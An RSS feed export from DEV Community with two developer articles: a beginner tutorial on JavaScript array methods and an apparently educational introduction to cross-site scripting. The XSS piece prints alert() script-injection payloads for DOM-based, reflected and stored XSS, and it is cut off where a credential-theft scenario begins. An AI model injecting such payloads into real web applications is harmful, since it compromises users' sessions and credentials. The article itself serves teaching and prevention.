<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>DEV Community</title>
    <author>DEV Community</author>
    <description>A constructive and inclusive social network for software developers. With you every step of your journey.</description>
    <link>https://dev.to</link>
    <language>en</language>
    <item>
      <title>How to use built-in array methods in JavaScript</title>
      <author>Marina Yamaoto</author>
      <pubDate>Mon, 18 Jan 2021 16:29:51 +0000</pubDate>
      <link>https://dev.to/marina294/how-to-use-built-in-array-methods-in-javascript-10ci</link>
      <guid>https://dev.to/marina294/how-to-use-built-in-array-methods-in-javascript-10ci</guid>
      <description>&lt;p&gt;When using an array, you will find that you have to do long iterations in many situations.&lt;br&gt;
Do you want to make your code readable and simple?&lt;br&gt;
Can be done by using built-in objects.&lt;br&gt;
There are various built-in objects in JavaScript.&lt;br&gt;
In this article, I will explain how to use the built-in array methods.&lt;/p&gt;
&lt;h1&gt;
  &lt;a href="#what-are-builtin-objects" class="anchor"&gt;
  &lt;/a&gt;
  What are built-in objects
&lt;/h1&gt;

&lt;p&gt;At first, what are built-in objects?&lt;br&gt;
Built-in objects provided from the beginning in JavaScript.&lt;br&gt;
There are four built-in objects: Array, Date, Math, and String for efficient handling of these objects. Each object has special-purpose properties and methods associated with it.&lt;/p&gt;
&lt;h1&gt;
  &lt;a href="#array-methods" class="anchor"&gt;
  &lt;/a&gt;
  Array methods
&lt;/h1&gt;

&lt;p&gt;There are many array methods &lt;a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array#instance_methods"&gt;on the list&lt;/a&gt;.&lt;br&gt;
let's see the top of useful methods.&lt;/p&gt;


&lt;h2&gt;
  &lt;a href="#add-amp-delete" class="anchor"&gt;
  &lt;/a&gt;
  "ADD &amp;amp; DELETE"
&lt;/h2&gt;


&lt;h2&gt;
  &lt;a href="#push" class="anchor"&gt;
  &lt;/a&gt;
  push()
&lt;/h2&gt;

&lt;p&gt;add a new element to the &lt;strong&gt;end&lt;/strong&gt; of the array. It returns the new length of the array. The original array will be modified.&lt;/p&gt;

&lt;p&gt;what is the good thing when you use push method?&lt;br&gt;
Let's see the example.&lt;br&gt;
&lt;iframe height="600" src="https://codepen.io/marina294/embed/VwKgwgj?height=600&amp;amp;default-tab=js,result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;The example above shows two ways to add an element.&lt;br&gt;
the first method is to specify the element number[4], which is the number added by one from the current last element number of the array you want to add and assign 'squirrel' to it.&lt;br&gt;
The elements of an array do not have to be contiguous. Therefore the index of the element to be added does not have to be the current last index plus one. If the number is not the current last index, it will be null between the new element.&lt;/p&gt;

&lt;p&gt;The second is push method.&lt;br&gt;
When you use push method, you don't need to count the current last element number of the array.  &lt;/p&gt;

&lt;p&gt;But push() returns the new &lt;strong&gt;length&lt;/strong&gt; of the array.&lt;br&gt;
when you print the 'push', you can see the length.&lt;br&gt;
So when you would like to print the new array, you have to write 'pets'. &lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#unshift" class="anchor"&gt;
  &lt;/a&gt;
  unshift()
&lt;/h2&gt;

&lt;p&gt;Add a new element or multiple elements to the &lt;strong&gt;top&lt;/strong&gt; of an array and returns the number of elements after the addition. The original array will be modified.&lt;/p&gt;

&lt;p&gt;It is used in the same way as push method, but if you are adding multiple elements at the same time, be careful about the order in which they are added. &lt;br&gt;
&lt;iframe height="600" src="https://codepen.io/marina294/embed/WNGPRpE?height=600&amp;amp;default-tab=js,result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;Alphabet1 Result is adding multiple elements at the same time. The alphabet starts "A".&lt;br&gt;
Alphabet2 result starts C. Because alphabet2 is adding elements in each method. &lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#pop" class="anchor"&gt;
  &lt;/a&gt;
  pop()
&lt;/h2&gt;

&lt;p&gt;Removes the &lt;strong&gt;last&lt;/strong&gt; element of an array. It returns the element and changes the length of the array. If the array is empty, it returns undefined. The original array will be modified.&lt;br&gt;
&lt;iframe height="600" src="https://codepen.io/marina294/embed/Exgraja?height=600&amp;amp;default-tab=js,result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#shift" class="anchor"&gt;
  &lt;/a&gt;
  shift()
&lt;/h2&gt;

&lt;p&gt;Removes the &lt;strong&gt;top&lt;/strong&gt; element of an array. It returns the element and changes the length of the array. If the array is empty, it returns undefined. The original array will be modified.&lt;br&gt;
&lt;iframe height="600" src="https://codepen.io/marina294/embed/mdrvMXX?height=600&amp;amp;default-tab=js,result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;First In First Out (FIFO) can be created by joining with push method as described above.&lt;br&gt;
&lt;iframe height="600" src="https://codepen.io/marina294/embed/xxEMqgZ?height=600&amp;amp;default-tab=js,result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#slicestart-end" class="anchor"&gt;
  &lt;/a&gt;
  slice(start, end)
&lt;/h2&gt;

&lt;p&gt;It retrieves the array elements from the array at the position specified in the "start" argument to the one before the array element at the position specified in the "end" argument and returns them as a new array. The original array will &lt;strong&gt;not&lt;/strong&gt; be modified.　The original array will be modified.&lt;/p&gt;

&lt;p&gt;If it only "start" argument, it retrieves the array elements from the array at the position specified in the "start" argument to the last array element and returns them as a new array.&lt;br&gt;
&lt;iframe height="600" src="https://codepen.io/marina294/embed/OJRdjBB?height=600&amp;amp;default-tab=js,result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;The difference between this method and the previous methods is that it does not modify the original array. So the Before array and After array are the same length.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#spliceindex-deletecount-element1-elementn" class="anchor"&gt;
  &lt;/a&gt;
  splice(index, deleteCount, element1, …, elementN)
&lt;/h2&gt;

&lt;p&gt;Removes an element from an array or adds an element to an array, and returns the removed element. It can also replace a specified range of elements in an array with other elements.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#-remove" class="anchor"&gt;
  &lt;/a&gt;
  - Remove
&lt;/h4&gt;

&lt;p&gt;If you do not specify any elements to be added, the elements in the specified range will simply be removed.&lt;br&gt;
&lt;iframe height="600" src="https://codepen.io/marina294/embed/oNzmGPa?height=600&amp;amp;default-tab=js,result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#-add" class="anchor"&gt;
  &lt;/a&gt;
  - Add
&lt;/h4&gt;

&lt;p&gt;If the deleteCount is specified as 0, the element to be removed will be 0 and the element specified in the argument will be added before the element specified in the start index. &lt;br&gt;
&lt;iframe height="600" src="https://codepen.io/marina294/embed/vYXbWjL?height=600&amp;amp;default-tab=js,result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#-replace" class="anchor"&gt;
  &lt;/a&gt;
  - Replace
&lt;/h4&gt;

&lt;p&gt;If you specify elements to be added, the elements in the specified range will be replaced.&lt;br&gt;
&lt;iframe height="600" src="https://codepen.io/marina294/embed/GRjzOYN?height=600&amp;amp;default-tab=js,result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#order" class="anchor"&gt;
  &lt;/a&gt;
  "ORDER"
&lt;/h2&gt;

&lt;h2&gt;
  &lt;a href="#sort" class="anchor"&gt;
  &lt;/a&gt;
  sort()
&lt;/h2&gt;

&lt;p&gt;Sort array elements by string order or by specified order and return the array after sorting. The original array will be modified.&lt;br&gt;
&lt;iframe height="600" src="https://codepen.io/marina294/embed/MWjLrmd?height=600&amp;amp;default-tab=js,result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;If the element is a string, it’s very simple. But if the element contains a number, be careful.&lt;br&gt;
&lt;iframe height="600" src="https://codepen.io/marina294/embed/gOwqojK?height=600&amp;amp;default-tab=js,result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;Whooops! It didn't sort!&lt;br&gt;
Even if the value stored in an element is a number, it is not sorted by the size of the number, but as a string after the number has been converted to a string. Therefore, the first character is sorted first, resulting in the result as shown above.&lt;/p&gt;

&lt;p&gt;In this case, compareFunction is useful.&lt;br&gt;
CompareFunction is a method of comparing two values and switching their order one by one.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;compareFunc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;a&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="nx"&gt;b&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;In this example, it takes two arguments, "a" and "b", and returns the result of comparing "a &amp;lt; b" in return. By checking whether "a" is smaller than "b", the order is switched.&lt;/p&gt;

&lt;p&gt;"&amp;lt;", "&amp;gt;", "==", and "-" can be used as comparison conditions to change the ascending or descending order.&lt;/p&gt;

&lt;p&gt;Let's see the number example again.&lt;br&gt;
&lt;iframe height="600" src="https://codepen.io/marina294/embed/GRjzQrz?height=600&amp;amp;default-tab=js,result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;Ta-dah! The numbers are now sorted!&lt;/p&gt;

&lt;p&gt;To sort in descending order, use the following&lt;br&gt;
&lt;iframe height="600" src="https://codepen.io/marina294/embed/dypadzj?height=600&amp;amp;default-tab=js,result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#reverce" class="anchor"&gt;
  &lt;/a&gt;
  reverce()
&lt;/h2&gt;

&lt;p&gt;Sorts of array elements in reverse order. The original array will be modified.&lt;/p&gt;

&lt;p&gt;&lt;iframe height="600" src="https://codepen.io/marina294/embed/LYRqQvX?height=600&amp;amp;default-tab=js,result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#repeat" class="anchor"&gt;
  &lt;/a&gt;
  "REPEAT"
&lt;/h2&gt;

&lt;h2&gt;
  &lt;a href="#foreach" class="anchor"&gt;
  &lt;/a&gt;
  forEach()
&lt;/h2&gt;

&lt;p&gt;It executes a provided callback function once for each array element.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#what-is-callback-function" class="anchor"&gt;
  &lt;/a&gt;
  What is callback function?
&lt;/h4&gt;

&lt;p&gt;Callback function is Functions passed as arguments. &lt;br&gt;
and after the function "A" is executed, the function "B" specified in the argument can be executed.&lt;/p&gt;

&lt;p&gt;if you want iterative processing, you can use for loop.&lt;br&gt;
&lt;iframe height="600" src="https://codepen.io/marina294/embed/BaLMrRQ?height=600&amp;amp;default-tab=js,result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;forEach does not require such initialization and can be written very efficiently.&lt;br&gt;
&lt;iframe height="600" src="https://codepen.io/marina294/embed/rNMPdJq?height=600&amp;amp;default-tab=js,result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;The forEach method extracts the elements in the array in order from the top and calls the callback function. The callback function is called with the value of the currently fetched element, the index of the element, and the array itself as arguments.&lt;/p&gt;

&lt;p&gt;&lt;iframe height="600" src="https://codepen.io/marina294/embed/yLaZKQq?height=600&amp;amp;default-tab=js,result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;It is also possible to retrieve the contents of an object!&lt;br&gt;
&lt;iframe height="600" src="https://codepen.io/marina294/embed/QWKYmXr?height=600&amp;amp;default-tab=js,result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#convert" class="anchor"&gt;
  &lt;/a&gt;
  "CONVERT"
&lt;/h2&gt;

&lt;h2&gt;
  &lt;a href="#map" class="anchor"&gt;
  &lt;/a&gt;
  map()
&lt;/h2&gt;

&lt;p&gt;It executes a callback function for each element and &lt;strong&gt;returns&lt;/strong&gt; the result as &lt;strong&gt;a new array&lt;/strong&gt;.&lt;br&gt;
&lt;iframe height="600" src="https://codepen.io/marina294/embed/ZEpwooE?height=600&amp;amp;default-tab=js,result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;In the callback function written as an argument, the value of the element received as an argument is converted to uppercase using the toUpperCase method, and the value is returned as the return value. After the same processing is done for all the elements, in turn, a new array with the returned values as elements is created and returned as the return value of the map method.&lt;/p&gt;

&lt;p&gt;The values of the elements in the new array are all uppercase versions of the values of the elements in the original array, but the original array is unmodified because the map method does nothing to the original array. It's called "undestructive method".&lt;br&gt;
for example sort(), splice(), push(), shift(), unshift(), reverse() will be modified of the original array. &lt;br&gt;
It's called "destructive method". &lt;br&gt;
When you want to back to the original array, if you already made "destructive method", you can't back to the original array. Sometimes it make many bugs. so please be careful to use "destructive method" in the code.&lt;/p&gt;
&lt;h4&gt;
  &lt;a href="#what-the-difference-with-foreach" class="anchor"&gt;
  &lt;/a&gt;
  What the difference with forEach()?
&lt;/h4&gt;

&lt;p&gt;You noticed these methods are very similar. What the difference between them? &lt;br&gt;
the answer is "return".&lt;br&gt;
forEach() is just an execution method、but map() will return the result as an array after execution.&lt;/p&gt;

&lt;p&gt;Let's see the example.&lt;br&gt;
&lt;iframe height="600" src="https://codepen.io/marina294/embed/LYRqrKX?height=600&amp;amp;default-tab=js,result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;This forEach() and map() are the same program and the result is the same. &lt;/p&gt;

&lt;p&gt;But how is "return"?&lt;br&gt;
&lt;iframe height="600" src="https://codepen.io/marina294/embed/vYXbagY?height=600&amp;amp;default-tab=js,result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;br&gt;
forEach is "undefined".&lt;/p&gt;

&lt;p&gt;Yay! Only map() has returned!&lt;br&gt;
You can see that the execution result is able to get the array data as "return value".&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#reducecall-backsum-elementinitial-value" class="anchor"&gt;
  &lt;/a&gt;
  reduce(call back(sum, element),Initial value)
&lt;/h2&gt;

&lt;p&gt;Add up the values of all the elements in the array in order and finally get the total value.&lt;/p&gt;

&lt;p&gt;&lt;iframe height="600" src="https://codepen.io/marina294/embed/poEGZMO?height=600&amp;amp;default-tab=js,result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;The first process will result in "1 + 2", and the sum will be stored in the accumulated value, and the next process will execute "3 + 3". Total value “15".&lt;/p&gt;

&lt;p&gt;What if the array elements contain objects?&lt;br&gt;
&lt;iframe height="600" src="https://codepen.io/marina294/embed/LYRqJXy?height=600&amp;amp;default-tab=js,result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;In such a case, if you do not specify the initial value, the object that is the value of the first element will be stored as it is as the initial value, which will not produce the intended result.&lt;br&gt;
Like this.&lt;br&gt;
&lt;iframe height="600" src="https://codepen.io/marina294/embed/VwKgGxW?height=600&amp;amp;default-tab=js,result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#search" class="anchor"&gt;
  &lt;/a&gt;
  "SEARCH"
&lt;/h2&gt;

&lt;h2&gt;
  &lt;a href="#filter" class="anchor"&gt;
  &lt;/a&gt;
  filter()
&lt;/h2&gt;

&lt;p&gt;Use a callback function to determine whether or not the elements in the array meet the conditions, and create a new array with only the elements that meet the conditions.&lt;br&gt;
&lt;iframe height="600" src="https://codepen.io/marina294/embed/jOMdpxY?height=600&amp;amp;default-tab=js,result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;In the callback function as the argument of the filter method, if the length of the element received as the argument is greater than 4, true is returned, otherwise false is returned. After calling the callback functions for all the elements, in turn, a new array containing the elements that returned true is created and returned as the return value of the filter method.&lt;/p&gt;

&lt;p&gt;The filter method does not do anything to the original array, so the original array is not modified. This method is undestructive method.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#indexofelement-firstindex" class="anchor"&gt;
  &lt;/a&gt;
  indexOf(element, firstIndex)
&lt;/h2&gt;

&lt;p&gt;Search the array for an element and returns its first index. If it is not found, returned -1.&lt;br&gt;
&lt;iframe height="600" src="https://codepen.io/marina294/embed/bGwzmNJ?height=600&amp;amp;default-tab=js,result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;there is one more character “Cat" in the string, but the program will terminate after returning the first matching position.&lt;/p&gt;

&lt;p&gt;What happens if you specify "2" as the "firstInde"?&lt;br&gt;
&lt;iframe height="600" src="https://codepen.io/marina294/embed/LYRqgGO?height=600&amp;amp;default-tab=js,result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;br&gt;
A second "Cat" will be output!&lt;/p&gt;

&lt;p&gt;That's all I introduced useful array methods in built-in objects! &lt;br&gt;
Enjoy coding :)&lt;/p&gt;

</description>
      <category>javascript</category>
    </item>
    <item>
      <title>XSS: What it is, how it works, and how to prevent it</title>
      <author>Kyle Mistele</author>
      <pubDate>Mon, 18 Jan 2021 16:22:02 +0000</pubDate>
      <link>https://dev.to/kmistele/xss-what-it-is-how-it-works-and-how-to-prevent-it-589o</link>
      <guid>https://dev.to/kmistele/xss-what-it-is-how-it-works-and-how-to-prevent-it-589o</guid>
      <description>&lt;p&gt;If you're a developer, chances are that you've heard of cross-site scripting. Cross-site scripting, commonly known as XSS, is one of the &lt;a href="https://owasp.org/www-project-top-ten/"&gt;top 10 most common web security vulnerabilities&lt;/a&gt; according to &lt;a href="https://owasp.org"&gt;OWASP&lt;/a&gt;. Cross-site scripting continues to be a major problem in many web applications, and it can result in some serious problems. As a developer, it's important to know what XSS is and to be aware of it, but it's &lt;em&gt;even more important&lt;/em&gt; to know how to prevent it. Cybersecurity isn't just for security specialists, it's for everyone.&lt;/p&gt;

&lt;p&gt;Today, I'm going to give you an introduction to XSS. Specifically, I'm going to cover:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;What XSS is, and the 3 types of XSS&lt;/li&gt;
&lt;li&gt;Why XSS matters&lt;/li&gt;
&lt;li&gt;How to prevent XSS in your web applications&lt;/li&gt;
&lt;/ol&gt;

&lt;h1&gt;
  &lt;a href="#what-is-xss" class="anchor"&gt;
  &lt;/a&gt;
  What is XSS?
&lt;/h1&gt;

&lt;p&gt;Cross-site scripting occurs when attackers or malicious users can manipulate a web site or web application to return malicious JavaScript to users. When this malicious JavaScript is executed in the user's browser, all of the user's interactions with the site (including but not limited to authentication and payment) can be compromised by the attacker.&lt;/p&gt;

&lt;p&gt;There are 3 primary types of cross-site scripting:&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#dombased-xss" class="anchor"&gt;
  &lt;/a&gt;
  DOM-based XSS
&lt;/h2&gt;

&lt;p&gt;This type of XSS occurs when user input is manipulated in an unsafe way in the DOM (Document Object Map) by JavaScript. For example, this can occur if you were to read a value from a form, and then use JavaScript to write it back out to the DOM. If an attacker can control the input to that form, then they can control the script that will be executed. Common sources of DOM-based XSS include the &lt;code&gt;eval()&lt;/code&gt; function and the &lt;code&gt;innerHTML&lt;/code&gt; attribute, and attacks are commonly executed through the URL. PortSwigger has a &lt;a href="https://portswigger.net/web-security/cross-site-scripting/dom-based"&gt;great article&lt;/a&gt; on this. I've included an example below:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;getElementById&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;username_input&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;username_box&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;getElementById&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;username_box&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="nx"&gt;user_name_box&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;innerHTML&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;username&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;To exploit this vulnerability, you could insert a malicious script into the input that would be executed:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class="nb"&gt;window&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Cross site scripting has occurred!&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#reflected-xss" class="anchor"&gt;
  &lt;/a&gt;
  Reflected XSS
&lt;/h2&gt;

&lt;p&gt;Reflected XSS is similar to DOM-based XSS: it occurs when the web server receives an HTTP request, and "reflects" information from the request back into the response in an unsafe manner. An example would be where the server will place the requested application route or URL in the page that is served back to the user. An attacker can construct a URL with a malicious route that contains JavaScript, such that if a user visits the link, the script will execute.&lt;/p&gt;

&lt;p&gt;Malicious URLs containing cross-site scripting are commonly used as &lt;a href="https://en.wikipedia.org/wiki/Social_engineering_%28security%29"&gt;social engineering&lt;/a&gt; helpers in phishing emails or malicious links online.&lt;/p&gt;

&lt;p&gt;Here's an example - given a route that will 404,&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;GET https://example.com/route/that/will/404
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;a vulnerable server might generate the response like so:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;404&lt;span class="nt"&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;p&amp;gt;&lt;/span&gt; Error: route "/route/that/will/404 was not found on the server&lt;span class="nt"&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;An attacker could exploit this by constructing a URL like this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;https://example.com//route/that/will/404/&amp;lt;script&amp;gt;alert('XSS!');
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;When the user loads the page, the URL will be templated into the page, the script tags will be interpreted as HTML, and the malicious script will execute. PortSwigger has a great &lt;a href="https://portswigger.net/web-security/cross-site-scripting/reflected"&gt;article&lt;/a&gt; on this as well.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#stored-xss" class="anchor"&gt;
  &lt;/a&gt;
  Stored XSS
&lt;/h2&gt;

&lt;p&gt;Stored XSS occurs when user-created data is stored in a database or other persistent storage, and is then loaded into a page. Common examples of types of applications that do this include forums, comment plugins, and similar applications. Stored XSS is particularly dangerous when the stored content is displayed to many or all users of the application, because then one user can compromise the site for any user that visits it, without requiring that they click on a specific link.&lt;/p&gt;

&lt;p&gt;For example, suppose that a forum thread's posts are stored in a database, and that they're loaded whenever someone visits the thread and displayed. A malicious user could leave a comment that contains malicious JavaScript between &lt;code&gt;&amp;lt;script&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt; tags in their post, and then the script would execute in the browser of any user that visits the page. &lt;/p&gt;

&lt;p&gt;For example, their post in the threat might look something like this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;This is some text replying to the thread &lt;span class="nt"&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;XSS&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#why-does-crosssite-scripting-matter" class="anchor"&gt;
  &lt;/a&gt;
  Why does Cross-site scripting matter?
&lt;/h2&gt;

&lt;p&gt;This is all well and good, you might think, but what does it matter? So what if someone can make an &lt;code&gt;alert()&lt;/code&gt; bubble pop up on my webpage? That's a fair question - most XSS examples, including the ones I provided above, use &lt;code&gt;alert()&lt;/code&gt; as a proof-of-concept. However, cross-site scripting is by no means limited to &lt;code&gt;alert()&lt;/code&gt; bubbles - an attacker could execute any malicious JavaScript they wanted to. Let's think about a few scenarios.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#scenario-1-stealing-credentials-from-a-login-page" class="anchor"&gt;
  &lt;/a&gt;
  Scenario 1: Stealing credentials from a login page
&lt;/h3&gt;

&lt;p&gt;Suppose that an attacker has discovered a cross-site scripting vulnerability in a login page on a website. They could inject JavaScript to add an event listener to the form, such that whenever it is submitted it captures the username and password of the user that's trying to log in and sends them to a server controlled by the attacker:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="c1"&gt;// add an event listener to the form &lt;/span&gt;
